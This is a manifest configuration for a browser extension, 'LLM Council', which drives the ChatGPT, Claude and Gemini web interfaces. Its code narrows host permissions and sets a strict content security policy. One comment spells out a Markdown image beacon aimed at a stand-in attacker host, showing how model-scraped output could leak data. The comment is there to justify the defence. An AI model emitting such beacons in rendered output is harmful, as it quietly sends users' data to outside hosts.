import { defineManifest } from '@crxjs/vite-plugin'
import pkg from './package.json' with { type: 'json' }

// Security Constraint 1 (PRD §2): host_permissions are strictly jailed to the
// authorized LLM domains only. NEVER add <all_urls> or *://*/* here.
const HOST_PERMISSIONS = [
  '*://chatgpt.com/*',
  '*://claude.ai/*',
  '*://gemini.google.com/*',
]

export default defineManifest({
  manifest_version: 3,
  name: 'LLM Council',
  version: pkg.version,
  description:
    'Orchestrates a 3-stage council debate across ChatGPT, Claude, and Gemini by driving their web UIs. No API keys, no background network calls.',
  permissions: ['tabs', 'storage', 'scripting', 'sidePanel', 'alarms'],
  host_permissions: HOST_PERMISSIONS,
  // Security Constraint 2 (PRD §2, ADR-0002/ADR-0008): the side panel renders
  // untrusted, model-scraped Markdown, so lock down what its page may load.
  //   img-src 'self' data:  → no remote image beacons (a scraped
  //                           `![](https://attacker/?leak)` cannot phone home)
  //   connect-src 'self'    → no fetch/XHR/WebSocket egress to any external host
  //   script/object 'self'  → MV3 baseline; no inline or remote scripts
  //   style-src 'unsafe-inline' is required for React inline `style=` attributes.
  content_security_policy: {
    extension_pages:
      "script-src 'self'; object-src 'self'; img-src 'self' data:; " +
      "connect-src 'self'; style-src 'self' 'unsafe-inline'; " +
      "base-uri 'self'; frame-src 'none'",
  },
  icons: {
    16: 'public/icons/icon-16.png',
    32: 'public/icons/icon-32.png',
    48: 'public/icons/icon-48.png',
    128: 'public/icons/icon-128.png',
  },
  background: {
    service_worker: 'src/background/background.js',
    type: 'module',
  },
  action: {
    default_title: 'Open LLM Council',
    default_icon: {
      16: 'public/icons/icon-16.png',
      32: 'public/icons/icon-32.png',
      48: 'public/icons/icon-48.png',
      128: 'public/icons/icon-128.png',
    },
  },
  side_panel: {
    default_path: 'index.html',
  },
  content_scripts: [
    {
      matches: HOST_PERMISSIONS,
      js: ['src/content/content_script.js'],
      run_at: 'document_idle',
      all_frames: false,
    },
  ],
})
